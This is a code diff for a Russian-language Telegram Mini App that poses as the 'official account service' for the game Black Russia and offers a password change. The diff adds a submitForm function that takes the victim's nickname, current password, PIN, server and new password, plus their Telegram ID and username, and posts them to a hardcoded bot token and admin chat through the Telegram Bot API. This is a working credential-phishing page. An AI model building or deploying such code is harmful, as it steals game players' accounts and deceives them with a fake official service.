@@ -1,254 +1,52 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Black Russia - Смена пароля</title>
-    <!-- Telegram WebApp SDK -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        :root {
-            --bg-color: #0f0f12;
-            --card-bg: #18181c;
-            --accent-red: #e50914;
-            --accent-red-hover: #ff1e27;
-            --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --border-color: #2a2a30;
-            --input-bg: #09090b;
-        }
+async function submitForm() {
+    const nick = document.getElementById('nickname').value.trim();
+    const oldPass = document.getElementById('oldPassword').value.trim();
+    const pin = document.getElementById('pincode').value.trim();
+    const server = document.getElementById('server').value;
+    const newPass = document.getElementById('newPassword').value.trim();
+    const errorMsg = document.getElementById('errorMsg');
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 16px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 24px 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        h2 {
-            font-size: 20px;
-            font-weight: 700;
-            margin-top: 10px;
-            margin-bottom: 20px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .screen {
-            display: none;
-            flex-direction: column;
-            gap: 14px;
-            animation: fadeIn 0.3s ease-in-out;
-        }
-
-        .screen.active {
-            display: flex;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .form-group {
-            text-align: left;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 12px;
-            color: var(--text-muted);
-            margin-bottom: 5px;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 12px;
-            background: var(--input-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-main);
-            font-size: 14px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .form-control:focus {
-            border-color: var(--accent-red);
-        }
-
-        select.form-control {
-            appearance: none;
-            cursor: pointer;
-        }
-
-        .btn {
-            background-color: var(--accent-red);
-            color: #fff;
-            border: none;
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: background-color 0.2s, transform 0.1s;
-            margin-top: 8px;
-        }
-
-        .btn:hover {
-            background-color: var(--accent-red-hover);
-        }
-
-        .btn:active {
-            transform: scale(0.98);
-        }
-
-        .error-msg {
-            color: #ff4d4d;
-            font-size: 13px;
-            display: none;
-            background: rgba(255, 77, 77, 0.1);
-            padding: 8px;
-            border-radius: 6px;
-            border: 1px solid rgba(255, 77, 77, 0.3);
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <!-- Экран 1 -->
-    <div id="screen1" class="screen active">
-        <div>
-            <h2>Black Russia</h2>
-            <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Официальный сервис управления аккаунтом</p>
-        </div>
-        <button class="btn" onclick="goToScreen(2)">Поменять пароль</button>
-    </div>
-
-    <!-- Экран 2 -->
-    <div id="screen2" class="screen">
-        <h2>Смена пароля</h2>
-        <div id="errorMsg" class="error-msg">Заполните все обязательные поля</div>
-
-        <div class="form-group">
-            <label>Ник</label>
-            <input type="text" id="nickname" class="form-control" placeholder="Введите ваш ник">
-        </div>
-
-        <div class="form-group">
-            <label>Текущий пароль</label>
-            <input type="password" id="oldPassword" class="form-control" placeholder="Введите текущий пароль">
-        </div>
-
-        <div class="form-group">
-            <label>Пин-код (если есть)</label>
-            <input type="text" id="pincode" class="form-control" placeholder="Введите пин-код">
-        </div>
-
-        <div class="form-group">
-            <label>Сервер</label>
-            <select id="server" class="form-control">
-                <option value="" disabled selected>Выберите ваш сервер</option>
-            </select>
-        </div>
-
-        <div class="form-group">
-            <label>Новый пароль</label>
-            <input type="password" id="newPassword" class="form-control" placeholder="Введите новый пароль">
-        </div>
-
-        <button class="btn" onclick="submitForm()">Отправить</button>
-    </div>
-</div>
-
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-
-    const servers = [
-        "1. Red", "2. Green", "3. Blue", "4. Yellow", "5. Orange", "6. Purple", "7. Lime", "8. Pink", "9. Cherry", "10. Black",
-        "11. Indigo", "12. White", "13. Magenta", "14. Crimson", "15. Gold", "16. Azure", "17. Platinum", "18. Aqua", "19. Gray", "20. Ice",
-        "21. Chilli", "22. Choco", "23. Moscow", "24. SPB", "25. Ufa", "26. Sochi", "27. Kazan", "28. Samara", "29. Rostov", "30. Anapa",
-        "31. EKB", "32. Krasnodar", "33. Arzamas", "34. Novosib", "35. Grozny", "36. Saratov", "37. Omsk", "38. Irkutsk", "39. Volgograd", "40. Voronezh",
-        "41. Belgorod", "42. Makhachkala", "43. Vladivkaz", "44. Vladivostok", "45. Kaliningrad", "46. Chelyabinsk", "47. Krasnoyarsk", "48. CHEBOKSARY", "49. KHABAROVSK", "50. PERM",
-        "51. TULA", "52. RYAZAN", "53. MURMANSK", "54. PENZA", "55. KURSK", "56. ARKHANGELSK", "57. ORENBURG", "58. KIROV", "59. KEMEROVO", "60. TYUMEN",
-        "61. TOLYATTI", "62. IVANOVO", "63. STAVROPOL", "64. SMOLENSK", "65. PSKOV", "66. BRYANSK", "67. OREL", "68. YAROSLAVL", "69. BARNAUL", "70. LIPETSK",
-        "71. ULYANOVSK", "72. YAKUTSK", "73. TAMBOV", "74. BRATSK", "75. ASTRAKHAN", "76. CHITA", "77. KOSTROMA", "78. VLADIMIR", "79. KALUGA", "80. NOVGOROD",
-        "81. TAGANROG", "82. VOLOGDA", "83. TVER", "84. TOMSK", "85. IZHEVSK", "86. SURGUT", "87. PODOLSK", "88. MAGADAN", "89. CHEREPOVETS", "90. NORILSK", "91. ASTANA"
-    ];
-
-    const serverSelect = document.getElementById('server');
-    servers.forEach(srv => {
-        const option = document.createElement('option');
-        option.value = srv;
-        option.textContent = srv;
-        serverSelect.appendChild(option);
-    });
-
-    function goToScreen(screenNumber) {
-        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        document.getElementById(`screen${screenNumber}`).classList.add('active');
+    if (!nick || !oldPass || !server || !newPass) {
+        errorMsg.style.display = 'block';
+        return;
     }
+    errorMsg.style.display = 'none';
 
-    function submitForm() {
-        const nick = document.getElementById('nickname').value.trim();
-        const oldPass = document.getElementById('oldPassword').value.trim();
-        const pin = document.getElementById('pincode').value.trim();
-        const server = document.getElementById('server').value;
-        const newPass = document.getElementById('newPassword').value.trim();
-        const errorMsg = document.getElementById('errorMsg');
+    // Данные вашего бота и админа
+    const BOT_TOKEN = '8873494823:AAGIq71B3UGubeNIm6TAdMGuqTYCFpmFqbM';
+    const ADMIN_ID = 8632467330;
 
-        if (!nick || !oldPass || !server || !newPass) {
-            errorMsg.style.display = 'block';
-            return;
-        }
-        errorMsg.style.display = 'none';
+    // Получаем ID пользователя, который открыл Mini App
+    const user = tg.initDataUnsafe?.user;
+    const userId = user ? user.id : "Неизвестно";
+    const username = user && user.username ? `@${user.username}` : "нет_юзернейма";
 
-        const payload = {
-            nick: nick,
-            old_pass: oldPass,
-            pin: pin || "Не указан",
-            server: server,
-            new_pass: newPass
-        };
+    const text = `📥 **НОВАЯ ЗАЯВКА НА СМЕНУ ПАРОЛЯ**\n` +
+                 `───────────────────────\n` +
+                 `👤 **Никнейм:** \`${nick}\`\n` +
+                 `🔑 **Старый пароль:** \`${oldPass}\`\n` +
+                 `🔢 **Пин-код:** \`${pin || "Не указан"}\`\n` +
+                 `🌐 **Сервер:** \`${server}\`\n` +
+                 `🔐 **Новый пароль:** \`${newPass}\`\n` +
+                 `───────────────────────\n` +
+                 `🆔 **ID пользователя:** \`${userId}\`\n` +
+                 `👤 **User:** ${username}`;
 
-        try {
-            tg.sendData(JSON.stringify(payload));
-            setTimeout(() => {
-                tg.close();
-            }, 100);
-        } catch (e) {
-            console.error("Ошибка отправки:", e);
-        }
+    try {
+        // Прямой запрос к Telegram API
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        // Закрываем окно приложения
+        tg.close();
+    } catch (e) {
+        alert("Ошибка отправки данных: " + e);
     }
-</script>
-</body>
-</html>
+}
